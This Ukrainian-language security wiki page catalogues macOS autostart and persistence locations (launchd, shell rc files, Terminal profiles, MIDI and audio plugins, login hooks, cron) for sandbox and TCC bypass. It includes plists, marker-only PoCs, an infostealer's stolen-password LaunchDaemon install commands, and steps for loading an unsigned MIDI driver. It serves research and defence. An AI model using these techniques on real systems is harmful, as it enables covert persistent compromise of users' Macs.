# Автозапуск macOS

{{#include ../banners/hacktricks-training.md}}

Цей розділ значною мірою ґрунтується на серії дописів у блозі [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Його мета — визначити місця, де запис файлу може призвести до подальшого виконання коду, подію, що запускає виконання, і необхідні дозволи. Наявність певного місця не доводить, що відповідний механізм увімкнено. Наведені нижче локальні перевірки виконано на macOS 26.5.2 (5 жовтня 2026 року); вони не встановлюють поведінку в усіх версіях macOS.

> [!NOTE]
> «Запуск через запис» не завжди означає «запускається одразу після запису». Деякі місця перевіряються лише під час входу в систему, запуску певної програми або виконання користувачем певної дії. Запис у payload уже налаштованого завдання також не означає наявності дозволу на реєстрацію нового завдання. Перш ніж покладатися на техніку, перевірте її в одноразовому обліковому записі або VM.

## Sandbox Bypass

> [!TIP]
> Тут ви знайдете місця автозапуску, корисні для **sandbox bypass**, що дають змогу просто виконати щось, **записавши це у файл** і **дочекавшись** дуже **поширеної** **дії**, визначеного **проміжку часу** або **дії, яку зазвичай можна виконати** зсередини sandbox без прав root.

### Launchd

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`/Library/LaunchAgents`**
  - **Тригер**: Вхід користувача в систему (або явна реєстрація)
  - Потрібні права root
- **`/Library/LaunchDaemons`**
  - **Тригер**: Завантаження системи (або явна реєстрація)
  - Потрібні права root
- **`/System/Library/LaunchAgents`**
  - **Тригер**: Вхід користувача в систему; захищене системне розташування Apple
- **`/System/Library/LaunchDaemons`**
  - **Тригер**: Завантаження системи; захищене системне розташування Apple
- **`~/Library/LaunchAgents`**
  - **Тригер**: Повторний вхід у систему

`launchd` не сканує розташування `~/Library/LaunchDaemons`. Завдання окремого користувача мають бути в `~/Library/LaunchAgents`; системний каталог daemon — це `/Library/LaunchDaemons`. У [посібнику Apple з запуску launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) описано розташування, які скануються.

> [!TIP]
> Цікавий факт: **`launchd`** має вбудований property list у секції Mach-o `__Text.__config`, яка містить інші добре відомі служби, що їх має запускати launchd. Крім того, ці служби можуть містити ключі `RequireSuccess`, `RequireRun` і `RebootOnSuccess`, які означають, що їх необхідно запустити й успішно завершити.
>
> Звісно, змінити його неможливо через підписування коду.

#### Опис та Exploitation

**`launchd`** — це **перший** **процес**, який виконує ядро OX S під час запуску, і останній, який завершується під час вимкнення. Його **PID** завжди має бути **1**. Цей процес **читатиме й виконуватиме** конфігурації, зазначені у **plist-файлах** **ASEP** у таких каталогах:

- `/Library/LaunchAgents`: агенти для окремих користувачів, встановлені адміністратором
- `/Library/LaunchDaemons`: системні daemon, встановлені адміністратором
- `/System/Library/LaunchAgents`: агенти для окремих користувачів, надані Apple.
- `/System/Library/LaunchDaemons`: системні daemon, надані Apple.

Коли користувач входить у систему, `launchd` завантажує plist-файли з `~/Library/LaunchAgents` цього користувача з його правами. Завдання запускаються відповідно до їхніх ключів; саме завантаження plist-файлу не означає негайного виконання процесу.

**Головна відмінність між агентами та daemon полягає в тому, що агенти завантажуються, коли користувач входить у систему, а daemon — під час запуску системи** (оскільки є служби, наприклад ssh, які потрібно запускати до того, як будь-який користувач отримає доступ до системи). Крім того, агенти можуть використовувати GUI, тоді як daemon мають працювати у фоновому режимі.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Кожен елемент `ProgramArguments` є окремим аргументом; `launchd` не розбирає один рядок як команду оболонки. Виправлений приклад вище можна перевірити на синтаксичну коректність, не завантажуючи його: `plutil -lint /path/to/example.plist`. Див. локальний розділ `man launchd.plist` для `ProgramArguments`, `RunAtLoad` і `KeepAlive`.

#### Тригери подій файлової системи в наявних завданнях

**Вже завантажений** агент або демон може використовувати `WatchPaths`, щоб запускатися зі зміною вказаного шляху. `QueueDirectories` запускає завдання, доки каталог не порожній; `StartOnMount` запускає його під час монтування тому. [Посібник Apple з launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) містить приклади з `WatchPaths` і `QueueDirectories`. Запис у файл, за яким спостерігають, запускає **вже налаштоване завдання**; довільне виконання коду можливе лише тоді, коли той, хто виконує запис, також може контролювати виконуваний файл завдання, скрипт або дані, які інтерпретує завдання. Сам запис нового plist-файлу поза каталогом, що сканується або зареєстрований, не завантажує його.

Цей PoC із самостійним очищенням реєструє **тимчасовий агент користувача** з унікальним ім’ям, змінює лише власний файл, за яким спостерігає, а потім видаляє агента. Його успішно запущено на macOS 26.5.2 без виходу із системи чи перезавантаження:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Локальний запуск вивів `watch fired: True`, а `bootout` завершився успішно. `launchctl bootstrap` тут використовується лише в ізольованому PoC; він **не потрібен** для job, який уже завантажено. Щоб безпечно перевірити наявний job, прочитайте його plist і шлях `ProgramArguments` після розв’язання, а потім перевірте, чи можна записувати у відповідний виконуваний файл або інтерпретований файл, не змінюючи його.

Бувають випадки, коли **agent потрібно виконати до входу користувача в систему**; вони називаються **PreLoginAgents**. Наприклад, це корисно для забезпечення доступу до допоміжних технологій під час входу. Їх також можна знайти в `/Library/LaunchAgents` (див. [**тут**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) приклад).

> [!TIP]
> Нові конфігураційні файли Daemon або Agent буде **завантажено після наступного перезавантаження або за допомогою** `launchctl load <target.plist>`. **Також можна завантажувати файли .plist без цього розширення** за допомогою `launchctl -F <file>` (однак ці файли plist не завантажуватимуться автоматично після перезавантаження).\
> Також можна **вивантажити** їх за допомогою `launchctl unload <target.plist>` (указаний процес буде завершено),
>
> Щоб **переконатися**, що **ніщо** (наприклад, override) **не перешкоджає** **виконанню** **Agent** або **Daemon**, виконайте: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Виведіть список усіх agents і daemons, завантажених поточним користувачем:

```bash
launchctl list
```

#### Приклад ланцюжка зловмисного LaunchDaemon (повторне використання пароля)

Нещодавно macOS infostealer повторно використав **перехоплений пароль sudo**, щоб створити user agent і root LaunchDaemon:<sup>[[1]](#references)</sup>

- Записати цикл агента у `~/.agent` і зробити його виконуваним.
- Створити plist у `/tmp/starter`, що вказує на цього агента.
- Повторно використати викрадений пароль із `sudo -S`, щоб скопіювати файл у `/Library/LaunchDaemons/com.finder.helper.plist`, встановити власника `root:wheel` і завантажити його за допомогою `launchctl load`.
- Тихо запустити агента через `nohup ~/.agent >/dev/null 2>&1 &`, щоб від'єднати вивід.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Plist демона, розміщений у `/Library/LaunchDaemons`, не стає безпечним, якщо призначити його власником користувача. `launchd` вимагає належного власника й дозволів для системних завдань і може відхилити незахищений plist. Демон, власником якого є root, зазвичай працює від імені root, якщо його конфігурація не вибирає інший обліковий запис. Перевірте `UserName`, `GroupName`, власника й діагностику `launchctl`; не визначайте, від чийого імені виконується завдання, лише за іменем власника plist.

#### Докладніше про launchd

**`launchd`** — це **перший** процес у режимі користувача, який запускається з **ядра**. Запуск процесу має бути **успішним**, і він **не може завершитися чи аварійно припинити роботу**. Він навіть **захищений** від деяких **сигналів завершення процесу**.

Одне з перших завдань `launchd` — **запустити** всі **демони**, наприклад:

- **Демони таймерів**, які запускаються за розкладом:
  - `com.apple.atrun.plist` викликає `/usr/libexec/atrun` із `StartInterval = 30` секунд у macOS 26.5.2; фактичний стан увімкнення може відрізнятися від значення ключа `Disabled` у plist, оскільки `launchd` зберігає перевизначення окремо.
  - `com.vix.cron.plist` викликає `/usr/sbin/cron`, якщо в `/usr/lib/cron/tabs` є завдання. `com.apple.systemstats.daily` — це інша служба з розкладом, а не демон cron.
- **Мережеві демони**, наприклад:
  - `org.cups.cups-lpd`: прослуховує TCP (`SockType: stream`) із `SockServiceName: printer`
    - `SockServiceName` має бути портом або службою з `/etc/services`
  - `com.apple.xscertd.plist`: прослуховує TCP-порт 1640
- **Демони шляхів**, які запускаються, коли вказаний шлях змінюється:
  - `com.apple.postfix.master`: перевіряє шлях `/etc/postfix/aliases`
- **Демони сповіщень IOKit**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Порт Mach:**
  - `com.apple.xscertd-helper.plist`: у записі `MachServices` указано ім'я `com.apple.xscertd.helper`
- **UserEventAgent:**
  - Це відрізняється від попереднього. Він змушує launchd запускати програми у відповідь на певні події. Однак у цьому випадку задіяний основний бінарний файл — не `launchd`, а `/usr/libexec/UserEventAgent`. Він завантажує плагіни з папки із захистом SIP `/System/Library/UserEventPlugins/`, де кожен плагін указує свій ініціалізатор у ключі `XPCEventModuleInitializer` або, для старіших плагінів, у словнику `CFPluginFactories` під ключем `FB86416D-6164-2070-726F-70735C216EC0` файлу `Info.plist`.

### файли запуску shell

Опис: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Опис (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Але потрібно знайти програму з обходом TCC, яка запускає shell, що завантажує ці файли

#### Розташування

- **`~/.zshenv`** (або новіший скомпільований **`~/.zshenv.zwc`**)
  - **Умова запуску**: будь-який звичайний виклик zsh, зокрема неінтерактивний `zsh -c`; `zsh -f` пропускає файли запуску користувача.
- **`~/.zshrc`**
  - **Умова запуску**: запускається інтерактивний zsh.
- **`~/.zprofile`, `~/.zlogin`**
  - **Умова запуску**: запускається login zsh; ці файли читаються до та після `.zshrc` відповідно.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Умова запуску**: відкрити термінал із zsh
  - Потрібен root
- **`~/.zlogout`**
  - **Умова запуску**: login zsh завершується нормально; файл не запускається під час завершення роботи кожного термінала чи shell.
- **`/etc/zlogout`**
  - **Умова запуску**: закрити термінал із zsh
  - Потрібен root
- Потенційно більше файлів описано в: **`man zsh`**
- **`~/.bashrc`**
  - **Умова запуску**: запустити інтерактивний **не-login** Bash. Інтерактивний login Bash читає його, лише якщо файл входу явно його підключає.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Умова запуску**: запустити login Bash; виконується перший доступний для читання файл у цьому порядку. `~/.profile` пропускається, якщо існує будь-який із двох попередніх файлів.
- **`/etc/profile`**
  - **Умова запуску**: запустити login Bash; для зміни потрібен root.
- **`~/.tcshrc`** або, якщо його немає, **`~/.cshrc`**
  - **Умова запуску**: запустити `tcsh`, зокрема неінтерактивний `tcsh -c` на цьому Mac. Користувач має фактично запустити `tcsh`; це не стандартний shell macOS.
- **`~/.login`**
  - **Умова запуску**: запустити login `tcsh` після його rc-файлу.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Умова запуску**: очікується запуск із xterm, але він **не встановлений**, а навіть після встановлення з'являється помилка: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Опис і експлуатація

Під час ініціалізації shell-середовища, наприклад `zsh` або `bash`, **запускаються певні файли запуску**. Наразі macOS використовує `/bin/zsh` як стандартний shell. Те, чи запускають Terminal або SSH login чи інтерактивний shell, залежить від їхньої конфігурації; не припускайте, що під час кожного сеансу запускаються всі наведені вище файли. Хоча `bash` і `sh` також наявні в macOS, для їх використання їх потрібно запускати явно.<sup>[[2]](#references)</sup> [Довідник із файлів запуску zsh](https://zsh.sourceforge.io/Doc/Release/Files.html) описує порядок читання, перевизначення `ZDOTDIR` і правило `.zwc`.

Наведений нижче експеримент лише для читання використовував одноразовий `ZDOTDIR` у macOS 26.5.2. Він показує, які файли користувача було прочитано; жоден справжній файл запуску shell не змінювався:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Зафіксований порядок був таким: `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` має вже вказувати на альтернативний каталог; просто створити файли в довільному каталозі недостатньо.

[Довідник запуску Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) розрізняє login-оболонки та інтерактивні оболонки. На тестовій машині з macOS 26.5.2 ізольований `HOME`, що містив усі чотири користувацькі файли запуску, дав такі результати: `bash -c` → жодного; `bash -ic` → `.bashrc`; `bash -lc` і `bash -lic` → лише `.bash_profile`. Після видалення `.bash_profile` login Bash читав `.bash_login`, а після його видалення — `.profile`. `BASH_ENV` може вказати неінтерактивному Bash файл, але цю змінну середовища потрібно заздалегідь встановити в процесі, який запускає Bash. Явний `exit` у login Bash також може завантажити `~/.bash_logout`.

Локальний довідник `tcsh(1)` описує окремий порядок запуску. Із тимчасовим `HOME` команда `/bin/tcsh -c :` читала `.tcshrc` або `.cshrc`, якщо `.tcshrc` не було. Login `tcsh`, запущений із тимчасовим `HOME`, читав `.tcshrc` і `.login`. Для цих перевірок створювали й видаляли лише тимчасові файли.

### Повторно відкриті програми

> [!CAUTION]
> Налаштування вказаного exploitation і вихід із системи з подальшим входом або навіть перезавантаження не призвели до запуску програми під час тестування. Можливо, програма має працювати під час виконання цих дій.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Тригер**: перезапуск, що повторно відкриває програми

#### Опис і exploitation

Усі програми для повторного відкриття перелічені у plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Щоб серед програм, які відкриваються повторно, запускалася ваша програма, достатньо **додати її до списку**.

UUID можна знайти, переглянувши цей каталог, або за допомогою `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Щоб перевірити, які програми буде відкрито повторно, виконайте:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Щоб **додати застосунок до цього списку**, можна скористатися:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Налаштування Terminal

Опис: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminal використовує дозволи FDA користувача, який ним користується

#### Розташування

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Тригер**: відкриття нового вікна або вкладки Terminal з профілем, у якому в налаштуваннях Shell задано команду запуску

#### Опис і експлуатація

У **`~/Library/Preferences`** зберігаються налаштування користувача для Applications. Деякі з цих налаштувань можуть містити конфігурацію для **виконання інших applications/scripts**.<sup>[[5]](#references)</sup>

Наприклад, Terminal може виконувати команду під час запуску:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Ця конфігурація відображається у файлі **`~/Library/Preferences/com.apple.Terminal.plist`** так:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Якщо відповідний профіль містить команду запуску й Terminal читає це налаштування, новий сеанс із цим профілем може виконати її. [У поточному посібнику Apple з Terminal](https://support.apple.com/guide/terminal/trmlshll/mac) описано команду для кожного профілю в розділі **Shell → Startup**. Самого відкриття Terminal без нового сеансу з цим профілем недостатньо. Наведені нижче зміни налаштувань **не виконувалися** на дослідницькому Mac.

Це можна додати через CLI за допомогою:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Скрипти Terminal / Інші розширення файлів

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminal може використовувати дозволи FDA користувача, який його запускає

#### Розташування

- **Будь-де**
  - **Тригер**: Відкрити файл `.terminal`, `.command` або `.tool`

#### Опис і експлуатація

Якщо користувач відкриє файл налаштувань **`.terminal`**, Terminal може створити сеанс на основі його профілю; виконувані файли **`.command`** і **`.tool`** також можуть відкриватися в Terminal. Це явний тригер відкриття файлу, а не виконання коду лише через відкриття Terminal. Успадкований доступ TCC залежить від фактичних дозволів Terminal і виконуваної операції. Наведений нижче історичний приклад не запускали на дослідницькому Mac.

Спробуйте так:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Також можна використовувати розширення **`.command`**, **`.tool`** зі звичайним вмістом shell-скриптів — вони теж відкриватимуться в Terminal.

> [!CAUTION]
> Якщо Terminal має **Full Disk Access**, він зможе виконати цю дію (зауважте, що виконувана команда буде видимою у вікні Terminal).

### Audio Plugins

Опис: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Опис: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Можна отримати додатковий доступ TCC

#### Розташування

- **`/Library/Audio/Plug-Ins/HAL`**
  - Потрібен root
  - **Тригер**: сервер Core Audio завантажує сумісний plug-in пристрою HAL; перезапуск сервера може спричинити повторне виявлення
- **`/Library/Audio/Plug-ins/Components`**
  - Потрібен root
  - **Тригер**: аудіохост виявляє та створює екземпляр встановленого Audio Unit
- **`~/Library/Audio/Plug-ins/Components`**
  - **Тригер**: аудіохост виявляє та створює екземпляр встановленого Audio Unit
- **`/System/Library/Components`**
  - Розташування, захищене системою та призначене для компонентів Apple
  - **Тригер**: аудіохост створює екземпляр відповідного системного компонента

#### Опис

Згідно з попередніми описами, можна **скомпілювати деякі аудіоплагіни** та домогтися їх завантаження.<sup>[[6]](#references)[[7]](#references)</sup>

Plug-in пристрою HAL та Audio Units завантажуються різними способами. У [посібнику Apple з розміщення Audio Unit](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) зазначено, що хост має знайти та створити екземпляр компонента; саме копіювання компонента до каталогу сканування або перезапуск `coreaudiod` не підтверджує його виконання. Plug-in AUv2 запускаються в процесі хоста, тоді як, згідно з [поточними рекомендаціями Apple щодо Audio Unit](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments), за замовчуванням AUv3 у macOS запускаються в окремому процесі. Вимоги до підпису, sandbox і перевірки бібліотек залежать від хоста. На дослідницькому Mac аудіоплагіни не встановлювалися й не запускалися.

### Драйвери CoreMIDI (MIDIServer)

Опис: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Ваш код виконується всередині процесу `MIDIServer`, а не в sandbox вашого застосунку
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` працює у власному sandbox-профілі `seatbelt`

#### Розташування

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Root не потрібен (доступний для запису користувачеві)
  - **Тригер**: запуск або перезапуск `MIDIServer`. Він запускається за вимогою, коли будь-який процес уперше використовує CoreMIDI (відкриває *Audio MIDI Setup*, GarageBand, DAW або сторінку, що використовує WebMIDI)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Потрібен root
  - **Тригер**: те саме, що вище

#### Опис та експлуатація

`MIDIServer` від Apple (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) завантажує MIDI **драйвери** з каталогів `Audio/MIDI Drivers`. Бінарний файл підписаний Apple, але має entitlement `com.apple.security.cs.disable-library-validation`, тому він завантажить bundle, який **не підписаний або підписаний ad-hoc іншим розробником**. Це дає змогу виконувати код в окремому процесі, що належить Apple, **без root**.<sup>[[53]](#references)</sup>

Перевірено в macOS 26 (лише читання):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Драйвер — це стандартний bundle, який експортує фабрику `MIDIDriverInterface`; розміщення payload у фабриці/конструкторі запускає його щойно `MIDIServer` перераховує драйвери. Зберіть його, помістіть у `~/Library/Audio/MIDI Drivers/Evil.plugin`, а потім запустіть завантаження без виходу із системи чи перезавантаження:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### Плагіни QuickLook

Опис: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Можна отримати додатковий доступ через TCC

#### Розташування

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Опис і експлуатація

Плагіни QuickLook можуть виконуватися, коли ви **відкриваєте попередній перегляд файлу** (натискаєте пробіл, вибравши файл у Finder), якщо встановлено **плагін, що підтримує цей тип файлу**.<sup>[[8]](#references)</sup>

Можна скомпілювати власний плагін QuickLook, розмістити його в одному з наведених вище каталогів, щоб завантажити його, а потім перейти до підтримуваного файлу й натиснути пробіл для його запуску.

Ці шляхи стосуються застарілих пакетів `.qlgenerator`; [посібник Apple з архітектури Quick Look](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) описує порядок пошуку та типи файлів, що відповідають плагінам. Сучасні **розширення програм** Quick Look постачаються разом із програмою та мають інші правила реєстрації й виконання. Наявність генератора не означає, що саме він буде вибраний для типу файлу або що його код виконуватиметься безпосередньо у Finder. Шлях застарілих генераторів перевірено за документацією та наявністю каталогів; на дослідницькому Mac жоден генератор не було встановлено чи завантажено.

### ~~Хуки входу/виходу~~

> [!CAUTION]
> У мене це не спрацювало ні з LoginHook користувача, ні з LogoutHook root

**Опис**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Корисно для обходу sandbox: [✅](https://emojipedia.org/check-mark-button)
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- Потрібно мати змогу виконати щось на кшталт `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  - Розташований у `~/Library/Preferences/com.apple.loginwindow.plist`

Ця функція застаріла, але її можна використовувати для виконання команд під час входу користувача в систему.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Цей параметр зберігається у `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Щоб видалити це:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Запис користувача root зберігається в **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Умовний Sandbox Bypass

> [!TIP]
> Тут ви знайдете місця автозапуску, корисні для **Sandbox Bypass**, що дає змогу просто виконати щось, **записавши це у файл** і **розраховуючи на не надто поширені умови**, як-от наявність певних **встановлених програм, «нетипові» дії користувача** або середовища.

### Cron

**Опис техніки**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Корисно для Sandbox Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Однак потрібно мати змогу виконати бінарний файл `crontab`
  - Або бути root
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`/usr/lib/cron/tabs/`**
  - Для прямого доступу на запис потрібні права root. Права root не потрібні, якщо ви можете виконати `crontab <file>`
  - **Тригер**: розклад у встановленому crontab. `at` і `periodic` — це окремі механізми, описані нижче.

#### Опис і експлуатація

Перегляньте cron-завдання **поточного користувача** за допомогою:

```bash
crontab -l
```

У `launchd plist` системного `cron`-демона є запис `QueueDirectories` для `/usr/lib/cron/tabs`; саме там зберігаються встановлені crontab-файли користувачів. Для перегляду crontab-файлів інших користувачів потрібні права `root`:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

